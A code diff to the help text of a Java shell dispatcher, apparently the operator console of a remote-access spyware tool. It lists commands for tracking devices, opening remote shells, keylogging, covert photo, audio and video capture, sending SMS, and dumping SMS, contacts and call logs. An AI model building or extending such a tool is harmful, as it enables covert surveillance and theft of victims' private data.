@@ -71,15 +71,19 @@ public class ShellDispatcher extends Dispatcher {
         System.out.println(
                 "start (port)\tCreates the server at the specified port (optional)\n"+
                 "show\tShows the devices connected to the bane service\n"+
+                "sysinfo\tGet system info about the device"+
                 "select <name>\tSelects the device\n"+
                 "track\tTracks the current position of the device\n"+
                 "sopen\tStarts a remote shell\n"+
                 "sclose\tCloses the remote shell\n"+
                 "news\tReturns the notifications\n"+
-                "keylog\tKeylogs the device\n"+
+                "keylog\tKeylogs the device (In development)\n"+
+                "photo\tTake photo (In development)\n"+
+                "record -d <time>\tRecord audio (In development)\n"+
+                "video -d <time>\tRecord video (In development)\n"+
                 "name <new name>\tChanges the name of the current device\n"+
                 "sendsms number \"text\"\tSends a message to a number"+
-                "getsms\tReturns all the sms of the device"
+                "dump [sms/contacts/calls]\tGet all sms/contacts/calls"
         );
     }
 
